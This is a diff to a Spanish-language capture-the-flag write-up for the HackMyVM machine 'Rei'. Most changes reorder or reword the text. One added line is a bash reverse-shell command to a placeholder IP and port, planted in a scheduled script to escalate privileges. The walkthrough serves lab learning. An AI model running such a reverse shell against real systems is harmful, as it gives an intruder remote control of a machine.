@@ -7,9 +7,9 @@ category    : [ HackMyVM ]
 tags        : [ Linux ]
 ---
 
-Canal Shelldredd Informática [https://www.youtube.com/c/ShellDreddInform%C3%A1tica](https://www.youtube.com/c/ShellDreddInform%C3%A1tica)
+En esta ocasión tenemos una máquina nivel Easy creada por ShellDredd, tendremos varios trolleos a lo largo de la explotación y debemos fijarnos y prestar atención a todo.
 
-En esta ocasión tenemos una máquina nivel Easy creada por Shelldredd, tendremos varios trolleos a lo largo de la explotación y debemos fijarnos y prestar atención a todo.
+Canal Shelldredd Informática [https://www.youtube.com/c/ShellDreddInform%C3%A1tica](https://www.youtube.com/c/ShellDreddInform%C3%A1tica)
 
 # Reconocimiento de Puertos
 
@@ -113,7 +113,6 @@ Pero hay que fijarse en todo, ya que la foto nos da varios datos interesantes...
 
 ![](/assets/images/HMV/Rei-HackMyVM/balance.gif)
 
-
 Podríamos estar ante un usuario y una posible contraseña... Asique porque no probar?
 
 ![](/assets/images/HMV/Rei-HackMyVM/karate1.gif)
@@ -148,7 +147,7 @@ Flag User:
 
 # Escalada de Privilegios
 
-Ahora toca escalar privilegios, y como siempre comenzamos enumerando vectores de escalada.
+Ahora toca escalar privilegios, y como siempre comenzamos enumerando para encontrar posibles vectores de escalada.
 
 Lanzo linpeas.sh pero no veo nada raro... asique paso a lanzar pspy para buscar procesos ocultos en ejecución
 
@@ -183,7 +182,7 @@ Ahí está lo que buscaba
 
 Lo que hay es un simple script en bash, pruebo a meter una shell en bash.
 
-
+`bash -i >& /dev/tcp/<ip>/<port> 0>&1`
 
 Abrimos un oyente de netcat y tras esperar unos segundos...
 
